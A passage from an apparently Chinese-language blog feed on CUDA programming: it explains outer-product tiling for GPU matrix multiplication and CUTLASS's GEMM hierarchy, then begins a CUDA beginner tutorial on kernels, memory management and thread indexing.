mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0502em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></span></p><p><img src="/img/PP/matseg.png" alt=""></p><p>上文中我们使用的 <code>matmul_tile2d_shared_gpu</code> 核函数是用矩阵乘内积的方式来实现矩阵乘的。</p><p>显然，矩阵乘内积和矩阵乘外积的计算次数是相同的。矩阵乘内积的好处是便于理解，每次得到的结果矩阵不会太大，做最后的结果聚合时通信开销也很低（只要把计算得到的矩阵填到对应位置就行），但坏处就是循环比较复杂（计算时需要双重循环产生最终的结果矩阵，可参考上面的动图），双重循环就意味着 GPU 会重复缓存相同行和列，增加了访存延迟，并可能导致潜在的缓存访问冲突等。</p><p>那么我们花这些篇幅来说明矩阵乘内积和矩阵乘外积，目的为何？其实很简单，<u>在遇到大矩阵相乘时，我们往往会使用矩阵外积完成矩阵乘法，因为矩阵乘外积只需要加载一遍矩阵就行了，减轻了内存带宽的压力。</u>我们指出，当它要处理大矩阵乘（尤其 k 过大时），切分出来的子矩阵无法放入到共享内存中，需要 split k 方向，增加了程序的复杂度，因此这次我们选择用更简单的矩阵乘外积来实现核函数。</p><p>也许会有这样的疑问：使用矩阵乘外积也会遇到 m 和 n 过大时，无法放入共享内存的问题，为何说矩阵乘外积实现要简单？<strong>因为矩阵乘内积的 split K 方向是在线程块内做的切分，实现起来比较复杂；而矩阵乘外积对 m 和 n 的切分是在线程块间和网格间做的，实现相对简单。</strong></p><p>为更好地说明切分和计算过程，简化问题，<strong>我们先假定 grid 的大小能覆盖整个矩阵</strong>。将矩阵按照下动图的方式切分，那么每个小块的厚度就是线程块中 x 或 y 方向的线程数量。程序仅有一层循环，循环次数就是 <code>(k + BLOCK_SIZE - 1) / BLOCK_SIZE</code>。</p><ol><li><p>第一次循环，处理<font color='red'>红色的数据块</font>的矩阵乘，与矩阵乘内积不同，这次计算出来的结果维度是<code>(m,n)</code>。循环中，grid 内的线程块按照编号，将对应的矩阵元素放入到自己内部的共享内存中，于是第一次循环时，grid 读取了矩阵 A 的一列和矩阵 B 的一行，于是可以计算出矩阵 C 的部分和。</p></li><li><p>第二次循环，将往右移动读取矩阵 A 的一列，往下移动读取矩阵 B 的一行，那么<font color='orange'>橙色的数据块</font>会被读入共享内存中，再计算矩阵 C 的部分和</p></li><li><p>不断循环累加，就可以计算出矩阵 C。</p></li></ol><p><img src="/img/PP/matmul_outer_product.gif" alt=""></p><p>容易得出，对于第 i 次循环，需要加载到共享内存的数据是</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">int</span> y = blockIdx.y * blockDim.y + threadIdx.y;<br><span class="hljs-type">int</span> x = blockIdx.x * blockDim.x + threadIdx.x;<br><span class="hljs-type">int</span> tidy = threadIdx.y;<br><span class="hljs-type">int</span> tidx = threadIdx.x;<br>as[tidx][tidy] = a[x][tidy + i * BLOCK_SIZE];<br>bs[tidx][tidy] = b[tidx + i * BLOCK_SIZE][y];<br></code></pre></td></tr></table></figure><p>来看看 CUDA 的实现。线程块读取数据到共享内存后，需要加上 <code>__syncthreads()</code> 语句，确保所有线程已经读取完成，再开始下面的计算，同样也要加上 <code>__syncthreads()</code> 来保证所有线程都已经完成。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">template</span>&lt;<span class="hljs-type">int</span> BLOCK_SIZE&gt;</span><br><span class="hljs-function">__global__ <span class="hljs-type">void</span> <span class="hljs-title">matmul_outer_product_gpu</span><span class="hljs-params">(<span class="hljs-type">float</span>* c, <span class="hljs-type">float</span>* a, <span class="hljs-type">float</span>* b, <span class="hljs-type">int</span> m, <span class="hljs-type">int</span> n, <span class="hljs-type">int</span> k)</span> </span>&#123;<br>    <span class="hljs-type">int</span> y = blockIdx.y * blockDim.y + threadIdx.y;<br>    <span class="hljs-type">int</span> x = blockIdx.x * blockDim.x + threadIdx.x;<br>    <span class="hljs-type">int</span> tidy = threadIdx.y;<br>    <span class="hljs-type">int</span> tidx = threadIdx.x;<br>    <span class="hljs-type">float</span> v = <span class="hljs-number">0.0f</span>;<br>    __shared__ <span class="hljs-type">float</span> as[BLOCK_SIZE][BLOCK_SIZE];<br>    __shared__ <span class="hljs-type">float</span> bs[BLOCK_SIZE][BLOCK_SIZE];<br><br>    <span class="hljs-type">int</span> tilesx = (k + BLOCK_SIZE - <span class="hljs-number">1</span>) / BLOCK_SIZE;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; tilesx; i++) &#123;<br>        <span class="hljs-comment">// load data from global memory to shared memory</span><br>        as[tidx][tidy] = a[x * k + i * BLOCK_SIZE + tidy];<br>        bs[tidx][tidy] = b[(i * BLOCK_SIZE + tidx) * n + y];<br>        <span class="hljs-comment">// sync to wait for all threads in one block to finish loading datas</span><br>        __syncthreads();<br>        <span class="hljs-comment">// sub-matrix multiply</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> l = <span class="hljs-number">0</span>; l &lt; BLOCK_SIZE; l++) &#123;<br>            v += as[tidx][l] * bs[l][tidy];<br>        &#125;<br>        <span class="hljs-comment">// sync to wait for all threads in one block to finish compute</span><br>        __syncthreads();<br>    &#125;<br>    <span class="hljs-comment">// store results into global memory</span><br>    c[x * n + y] = v;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="更大的矩阵相乘——内积与外积的合用">更大的矩阵相乘——内积与外积的合用</h2><p>若 grid 的大小无法覆盖整个矩阵，我们就需要再用双重循环来切分过大的 m 和 n。</p><p>聪明的读者可能已经想到，切分过大的 m 和 n 已经在 <code>matmul_tile2d_gpu</code> 矩阵乘内积做过了。的确，我们又可以使用矩阵乘内积的方法将矩阵沿两个方向切分，如下图。但这回，每个小条状的矩阵乘其实是由 <code>matmul_outer_product_gpu</code> 矩阵乘外积计算得到的。也就是说，面对这样的大矩阵，我们选择使用矩阵乘内积 + 矩阵乘外积的组合方式完成矩阵乘计算。</p><p><img src="/img/PP/matmul_tile2d_outer_product.gif" alt=""></p><p>仿照上面的动图步骤，我们将矩阵乘内积中对矩阵的二维分块代码拿过来，套在矩阵乘外积的外面，即可成功计算出大矩阵的乘法结果。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">template</span>&lt;<span class="hljs-type">int</span> BLOCK_SIZE&gt;</span><br><span class="hljs-function">__global__ <span class="hljs-type">void</span> <span class="hljs-title">matmul_outer_product_tile2d_gpu</span><span class="hljs-params">(<span class="hljs-type">float</span>* c, <span class="hljs-type">float</span>* a, <span class="hljs-type">float</span>* b, <span class="hljs-type">int</span> m, <span class="hljs-type">int</span> n, <span class="hljs-type">int</span> k)</span> </span>&#123;<br><span class="hljs-type">int</span> tidy = threadIdx.y;<br><span class="hljs-type">int</span> tidx = threadIdx.x;<br><span class="hljs-type">int</span> thread_num_x = gridDim.x * blockDim.x;<br><span class="hljs-type">int</span> thread_num_y = gridDim.y * blockDim.y;<br><span class="hljs-type">int</span> x_grid_loop = (m + thread_num_x - <span class="hljs-number">1</span>) / thread_num_x;<br><span class="hljs-type">int</span> y_grid_loop = (n + thread_num_y - <span class="hljs-number">1</span>) / thread_num_y;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> mm = <span class="hljs-number">0</span>; mm &lt; x_grid_loop; mm++) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> nn = <span class="hljs-number">0</span>; nn &lt; y_grid_loop; nn++) &#123;<br>        <span class="hljs-type">int</span> y = nn * thread_num_y + blockIdx.y * blockDim.y + threadIdx.y;<br>        <span class="hljs-type">int</span> x = mm * thread_num_x + blockIdx.x * blockDim.x + threadIdx.x;<br>        <span class="hljs-type">float</span> v = <span class="hljs-number">0.0f</span>;<br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * matrix outer product</span><br><span class="hljs-comment">         * matmul_outer_product_gpu() part</span><br><span class="hljs-comment">         */</span><br>    &#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>小结一下，<code>matmul_outer_product_tile2d_gpu</code> 函数的实现思路就是先将矩阵按照矩阵乘内积的思路分割（如下图上半），再对每个小分块，使用矩阵乘外积的思路分割（如下图下半部），即先内积后外积的划分原则。后续我们会发现流行的开源库对矩阵乘的分割方法也遵循着上述原则。</p><p><img src="/img/PP/matsplit.png" alt=""></p><h3 id="分析与性能测试">分析与性能测试</h3><h2 id="cutlass-实现">cutlass 实现</h2><p>前面我们花了很大的功夫，从最简单的 GPU 实现出发，通过一步步地引入循环分块、 GPU 共享内存、矩阵乘的内外积等方法，摸索出了一套计算大矩阵乘法的复杂的矩阵乘 GPU 实现，并总结了先内积再外积的分割原则。</p><p>现在我们来看一下 <a href="https://github.com/NVIDIA/cutlass/tree/main">cutlass</a> (CUDA Templates for Linear Algebra Subroutines)，它是一个基于 CUDA C++ 模板实现的 gemm CUDA kernel 开源库，它分别实现了各个层级和尺度的高性能 GEMM kernel，现被广泛用于各个大模型的底层计算中。我们来看看它是如何将矩阵一步步分割计算的：</p><p><img src="/img/PP/cutlass_1.png" alt=""></p><hr><p>为了能充分压榨 GPU 的计算资源，cutlass 引入了一个设计精巧的 gemm 复杂层次结构，这个层次结构精确地与 <a href="https://docs.nvidia.com/cuda/cuda-c-programming-guide/index.html#programming-model">CUDA 编程模型</a> 相配，如图上图所示。</p><p>CUTLASS 将矩阵的计算过程自上到下分解成 Blocked GEMM, Thread Block Tile, Warp Tile, Thread Tile 四个层次，它们分别与 CUDA 编程模型中 Global grid, blocks, warps, threads 相对应。让我们一个一个来看：</p><p>首先是 Blocked GEMM，cutlass 首先使用矩阵乘内积划分方式，将矩阵 A 的 m 方向和矩阵 B 的 n 方向切分，切分后的每块由每个 grid 完成计算。然后，每个 grid 中，计算时会使用矩阵乘外积的划分方式沿 k 方向切分，grid 内的每个 block 负责完成其中高亮部分的计算，然后累加得到矩阵 C 的结果。可见，仍然遵循着先内积再外积的分割原则。</p><p><img src="/img/PP/cutlass-blocks-gemm.png" alt=""></p><p>然后是 Thread Block Tile。对于每个线程块，其线程数量一般是 128 的倍数，可参考<a href="https://zhuanlan.zhihu.com/p/442304996">如何设置CUDA Kernel中的grid_size和block_size？</a>。以下图为例，线程块数量为 256 为例，已知 CUDA 中一个 warp 有 32 个线程，于是一个线程块可分出 8 个 warp。仍遵循先内积后外积的分割原则，A tile 被一分为二，B tile 被一分为四，每个 warp 负责其中的一份计算。</p><p><img src="/img/PP/cutlass-warp-gemm.png" alt=""></p><p>而在 warp 计算内部，见下图。矩阵会被沿着 k 方向继续切割，执行矩阵乘外积的计算方式：</p><p><img src="/img/PP/cutlass-warp-level-gemm-operation.png" alt=""></p><p>Thread Tile 的有些复杂，因为一个 warp 只有 32 个线程，而要计算的元素有 128 组，所以每个线程需要执行 4 组元素的计算。对于 A fragment 和 B fragment 的分割仍遵循先内积的方法，而当一个线程将它负责的 4 组元素准备就绪后，会采用外积的方式执行计算。</p><p><img src="/img/PP/cutlass-thread-gemm.png" alt=""></p><p>从上面的分析和图片中可以明显看出，为了高效地完成大矩阵运算，cutlass 的工程师们不断地利用“先内积后外积”的原则，对矩阵进行分割，使之适配每一层的 CUDA 编程模型。</p><p>cutlass 的性能虽然逊于 cublas（2.8版本的数据），但由于其开源、灵活可适配的优点，仍为业界广泛使用。</p><p><img src="/img/PP/cutlass-2.8-cublas.png" alt=""></p>]]></content>
    
    
    <categories>
      
      <category>Parallel Computing</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CUDA</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CUDA 快速入门</title>
    <link href="/2021/10/08/2021-10-8-cuda-beginer/"/>
    <url>/2021/10/08/2021-10-8-cuda-beginer/</url>
    
    <content type="html"><![CDATA[<h1>CUDA 快速入门</h1><p>欢迎来到 CUDA 的世界。本文集中讲述了最基本的 CUDA 知识，供自己以及各位速查。</p><h2 id="CUDA-与-GPU-编程">CUDA 与 GPU 编程</h2><p>近年来，AI、比特币的发展对计算能力提出了无尽的需求。而在这之前，人们就已经发现，用于渲染、加载图形的 GPU 有着不俗的计算能力，为了能更好地利用 GPU 的计算能力，使得 GPU 不仅仅局限于做图形渲染，NVIDIA 率先推出了可编程的 GPU 芯片以及相应的软件框架：CUDA。让显卡可以用于图像计算以外的目的。</p><p>在使用 CUDA 进行编程时，往往需要区分哪些数据在 GPU 上计算，哪些数据在 CPU 上计算，还需要考虑数据之间的迁移、传输和存储等。一般地，用<strong>主机</strong>一词指代 CPU 及其系统内存，而用<strong>设备</strong>一词指代 GPU 及其片上、板上内存。很多情况下，CUDA 程序里既包含运行在主机上的程序，又包含运行在设备上的程序，且主机与设备之间存在数据传输，在编程时要格外注意这点。</p><center><img src="/img/PP/gpudevotes.png" /><br><div style="color:orange; border-bottom: 1px solid #d9d9d9;    display: inline-block;    color: #999;    padding: 2px;">GPU 的计算资源比 CPU 多得多</div></center><p>在开始前，先来简单了解 NVIDIA GPU 的并行计算的工作流程，从代码上看，分为两步：</p><ol><li>CPU 调用一种称为<strong>核函数</strong>的函数，该函数由 GPU 执行。</li><li>GPU 根据给定的并行量，并行执行该函数。</li></ol><p>CUDA 中，执行核函数的一个基本单位被称为线程（thread）。若干个 thread 组合成线程块（block），而一次调用中所有的线程块组成了一个网格（grid）。</p><center><img src="/img/PP/grid-of-thread-blocks.png"/><br><div style="color:orange; border-bottom: 1px solid #d9d9d9;    display: inline-block;    color: #999;    padding: 2px;">CUDA 线程层次</div></center><p>通常，CPU 调用核函数的同时，会指定执行该核函数的线程块数量和每个线程块中线程的数量。这也就意味着，核函数中的内容会被并行地执行线程块的数量 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>×</mo></mrow><annotation encoding="application/x-tex">\times</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord">×</span></span></span></span> 每个线程块内的线程数量次！</p><h2 id="核函数">核函数</h2><ul><li><code>__global__</code> 是 CUDA C/C++ 的函数修饰符，表示该函数为核函数</li><li>核函数会在 GPU 上执行，但由主机代码调用</li><li>返回类型必须为 <code>void</code></li><li>在调用kernel函数时，函数名后的<code>&lt;&lt;&lt;b, t&gt;&gt;&gt;</code>：b代表线程块的数目，t代表每个线程块的线程数目。</li></ul><p>CUDA 的核函数指的是需要运行在 GPU 上的函数。CUDA C 在标准 C 的基础上，增加了一些修饰符，是为了更好地区分和编译 GPU 程序。我们接触的第一个修饰符就是 <code>__global__</code>。该修饰符告诉编译器：被修饰的函数应当运行在 GPU 上，因此不能使用通用的 C 编译器对其编译，而是要使用 CUDA 提供的编译器（nvcc）。此外，核函数的输入和输出只能通过指针传递，因此返回类型都为 <code>void</code> ，且只能由主机调用。另一个修饰符 <code>__device__</code> 表示函数在 GPU 上运行，且不能被主机调用，只能由其他 <code>__global__</code> 修饰的函数调用。相对应地，<code>__host__</code> 修饰的函数应运行在 CPU 上，每次调用运行一次，且只能被主机调用。该描述符使用较少，因为所有未显式标明函数前置修饰符的函数均默认为主机函数。</p><p>调用核函数时，除了传递函数参数外，还需要指定线程块的数量和每个线程块的线程数量，用 <code>&lt;&lt;&lt;&gt;&gt;&gt;</code> 修饰。例如：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">__global__ <span class="hljs-type">void</span> <span class="hljs-title">myKernel</span><span class="hljs-params">()</span> </span>&#123;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hello world\n&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> <span class="hljs-type">const</span> *argv[])</span> </span>&#123;<br>    myKernel&lt;&lt;&lt;<span class="hljs-number">4</span>,<span class="hljs-number">2</span>&gt;&gt;&gt;();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>上例表示有4个线程块，每个线程块有2个线程，参与执行了该核函数。因此会输出8个 <code>Hello world\n</code>。而通过 CUDA 中的内置变量 <code>threadIdx</code>、<code>blockIdx</code> 和 <code>blockDim</code> 等，不仅可以在核函数内区分不同的线程块、线程，也能获得线程块、线程的维度信息，使程序员能更精细地控制线程执行，关于内置变量我会在之后详细介绍。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">__global__ <span class="hljs-type">void</span> <span class="hljs-title">addWithCuda</span><span class="hljs-params">(<span class="hljs-type">int</span> *c, <span class="hljs-type">int</span> *a, <span class="hljs-type">int</span> *b)</span></span>; &#123;<br>  <span class="hljs-type">int</span> i = threadIdx.x + blockIdx.x * blockDim.x;<br>  c[i] = a[i] + b[i];<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>  <span class="hljs-comment">// ...</span><br>  addWithCuda&lt;&lt;&lt;grids, blocks&gt;&gt;&gt;(dev_c, dev_a, dev_b);<br>  <span class="hljs-comment">// ...</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="内存管理">内存管理</h2><h3 id="内存分配与回收">内存分配与回收</h3><ul><li><code>cudaMalloc</code> 分配设备上的内存</li><li><code>cudaMemcpy</code> 将不同内存段的数据进行拷贝</li><li><code>cudaFree</code> 释放先前在设备上申请的内存空间</li></ul><p>CUDA C 本身十分贴近 C 语言，这对我们学习 CUDA 非常友好。但也有一些需要我们注意的地方，CUDA 对内存资源做了简单的分类。将 CPU 以及系统的内存称为主机内存（host memory），而将 GPU 及其内存称为设备内存（device memory）。它们的空间分配、数据迁移、回收等都需要程序员通过调用 cuda API 函数显式地控制。</p><p>在主机内存中分配、回收空间非常简单，使用 C 语言中的 <code>malloc()</code> 和 <code>free()</code> 函数就可以了，但要在设备内存分配空间，以便 GPU 进行计算，就需要用到 CUDA C 提供的函数了。以下两个函数用于分配、回收设备内存空间最为常用：</p><ul><li><p><code>cudaMalloc</code> 该函数用来分配设备上的内存，需要被主机调用（即在 CPU 执行的代码中调用）。其返回值为 <code>cudaError_t</code> 的枚举类型，该类型枚举了所有可能出现错误的情况。而如果函数调用成功，则返回 <code>cudaSuccess</code>。第一个参数类型为 <code>void **</code>，指向分配后得到的内存首地址。第二个参数类型为 <code>size_t</code>，指定了需要分配的内存大小，单位是字节。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 在设备上分配内存</span><br><span class="hljs-function">cudaError_t <span class="hljs-title">cudaMalloc</span><span class="hljs-params">(<span class="hljs-type">void</span>** devPtr, <span class="hljs-type">size_t</span> size)</span></span><br></code></pre></td></tr></table></figure></li><li><p><code>cudaFree</code> 该函数用来释放先前在设备上申请的内存空间，但不能释放通过 <code>malloc</code> 申请的内存。返回类型仍为 <code>cudaError_t</code>。函数参数是指向需要释放的设备内存首地址。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 释放设备上的内存</span><br><span class="hljs-function">cudaError_t <span class="hljs-title">cudaFree</span><span class="hljs-params">(<span class="hljs-type">void</span>* devPtr)</span></span><br></code></pre></td></tr></table></figure></li></ul><p>这两个函数与 C 语言中的内存分配、回收函数区别不是很大，由此不难猜到这两个函数的作用。</p><p>但容易犯的错误就是，将指向设备内存的指针错误地在主机内存中解引用（dereference），这是不允许的，因为该指针内的值可是设备内存的地址，不是主机内存的地址。</p><blockquote><p>CUDA C 的简单性及其强大的功能在很大程度上都是来源于它淡化了主机代码和设备代码之间的差异。虽然<strong>主机代码可以将这个指针作为参数传递，对其执行算术运算，甚至可以将其转换为另一种不同的类型</strong>。但是，绝对不可以使用这个指针来读取或者写入内存。因此，程序员一定<strong>不能在主机代码中对 cudaMalloc() 返回的指针进行解引用</strong>。—— &lt;&lt;GPU高性能编程CUDA实战&gt;&gt;</p></blockquote><h3 id="内存数据传输">内存数据传输</h3><p>完成主机内存与设备内存之间的数据传输，需要使用 <code>cudaMemcpy</code> 函数：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// src 中的数据拷贝到 dst 中，需要指定数据传输方向</span><br><span class="hljs-function">cudaError_t <span class="hljs-title">cudaMemcpy</span><span class="hljs-params">(<span class="hljs-type">void</span>* dst, <span class="hljs-type">const</span> <span class="hljs-type">void</span>* src, <span class="hljs-type">size_t</span> count, cudaMemcpyKind kind)</span></span><br></code></pre></td></tr></table></figure><p>其用法与 C 语言中 <code>memcpy</code> 非常相似，想必对熟悉 C 语言的大家没有难度。唯一区别在于多了个参数来指示内存传递的方向。<a href="https://docs.nvidia.com/cuda/cuda-runtime-api/group__CUDART__TYPES.html#group__CUDART__TYPES_1g18fa99055ee694244a270e4d5101e95b"><code>cudaMemcpyKind</code></a> 指示了数据的传输方向，有以下几种选择：</p><ul><li><code>cudaMemcpyHostToHost</code></li><li><code>cudaMemcpyHostToDevice</code></li><li><code>cudaMemcpyDeviceToHost</code></li><li><code>cudaMemcpyDeviceToDevice</code></li></ul><p>无须更多的解释，相信各位已经知道了上述常量的含义。</p><h3 id="错误处理">错误处理</h3><p>从前面的例子不难发现，几乎每个CUDA API函数都会返回 <code>cudaError_t</code> 类型的值，用来指示此次函数调用是否成功。当返回值为 <code>cudaSuccess</code> 时，函数调用成功。若失败，返回值会标记失败的具体代码，程序员可通过 <code>cudaGetErrorString</code> 函数获得具体的报错信息。为增强程序的鲁棒性，同时又不失代码美观，方便纠错，我推荐使用如下宏函数：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">define</span> GPUAssert(ans) &#123; gpuAssert((ans), __FILE__, __LINE__)</span><br><br><span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title">gpuAssert</span><span class="hljs-params">(cudaError_t code , <span class="hljs-type">const</span> <span class="hljs-type">char</span> *file, <span class="hljs-type">int</span> line, <span class="hljs-type">bool</span> abort = <span class="hljs-literal">true</span>)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (code != cudaSuccess) &#123;<br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;GPU assert: %s %s %d\n&quot;</span>, <span class="hljs-built_in">cudaGetErrorString</span>(code), file, line);<br>        <span class="hljs-keyword">if</span> (abort)<br>          <span class="hljs-built_in">exit</span>(code);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>调用 CUDA API 时，就可以用该宏函数将其包裹起来：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-built_in">GPUAssert</span>(<span class="hljs-built_in">cudaMalloc</span>(&amp;dev_a, <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">int</span>)));<br></code></pre></td></tr></table></figure><h2 id="内置变量与函数">内置变量与函数</h2><ul><li><p>线程编号的变量为 <code>threadIdx</code>，类型为 <code>uint3</code>，由三个描述不同方向上编号的整数组成，使用 <code>x</code>、<code>y</code>、<code>z</code> 和 <code>w</code> 依次访问</p><ul><li>threadIdx.x：线程块内在 x 方向上的该线程的 ID</li><li>threadIdx.y：线程块内在 y 方向上的该线程的 ID</li></ul></li><li><p>线程块编号的变量为 <code>blockIdx</code>，类型为 <code>uint3</code></p><ul><li>blockIdx.x：网格内在 x 方向上的该线程块的 ID</li><li>blockIdx.y：网格内在 y 方向上的该线程块的 ID</li></ul></li><li><p>线程块的线程数量使用 <code>blockDim</code> 变量描述</p><ul><li>blockDim.x：该线程块 x 方向上的线程总数</li><li>blockDim.y：该线程块 y 方向上的线程总数</li></ul></li><li><p>网格中线程块的数量使用 <code>gridDim</code> 变量描述</p><ul><li>gridDim.x：网格中 x 方向上的线程块总数</li><li>gridDim.y：网格中 y 方向上的线程块总数</li></ul></li><li><p><code>__syncthreads()</code> 是 CUDA 的内置命令。通常用于线程块内部的线程同步。当线程执行至 <code>__syncthreads()</code> 处时，会等待全部的线程执行完毕后再继续执行。</p></li></ul><p>结合前文的 CUDA 线程层次图，可以发现，使用三维向量（二维向量）来描述一个编号，可以极大方便图形变换、模型生成的编程和调试工作。因为在实际编程时，程序员可以将 GPU 的线程网格抽象成一个矩形或立方体，将它循环映射到要计算的资源上，而不再纠结于复杂的索引计算中。</p><p>来看一个简单向量加法的例子：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">__global__ <span class="hljs-type">void</span> <span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-type">int</span> *c, <span class="hljs-type">int</span> *a, <span class="hljs-type">int</span> *b)</span></span>; &#123;<br>  <span class="hljs-comment">// use built-in variable</span><br>  <span class="hljs-type">int</span> x = threadIdx.x + blockIdx.x * blockDim.x;<br>  <span class="hljs-type">int</span> y = threadIdx.y + blockIdx.y * blockDim.y;<br>  <span class="hljs-type">int</span> index = x + y * blockDim.x * gridDim.x;<br><br>  <span class="hljs-keyword">while</span> (index &lt; N) &#123;<br>    c[index] = a[index] + b[index];<br>    index += blockDim.x * gridDim.x;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>如果线程块大小为 256，每个线程块有 256 个线程，GPU 中的线程层级结构如下图：</p><p><img src="/img/PP/index.jpg" alt=""></p><p>可见，计算一个线程的唯一全局编号，还是比较复杂的，但也很常用。在这几行代码中，每个线程都得到了它在线程块中的索引以及这个线程块在网格中的索引，并且这两个索引是二维的，要转为一维的，还需要将 y 方向乘以 x 方向的总数。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">int</span> x = threadIdx.x + blockIdx.x * blockDim.x;<br><span class="hljs-type">int</span> y = threadIdx.y + blockIdx.y * blockDim.y;<br><span class="hljs-type">int</span> index = x + y * blockDim.x * gridDim.x;<br></code></pre></td></tr></table></figure><p>作为对前面知识的巩固，再来看一下部分 <code>main()</code> 函数的书写。主机程序先分配三块用于存贮向量的设备内存，在完成初始化后，将数据移动到设备端。主机调用核函数，并等待 GPU 执行完成，再将数据从设备移动到主机上，最后从中读取计算结果，并回收设备内存。</p><figure class="highlight 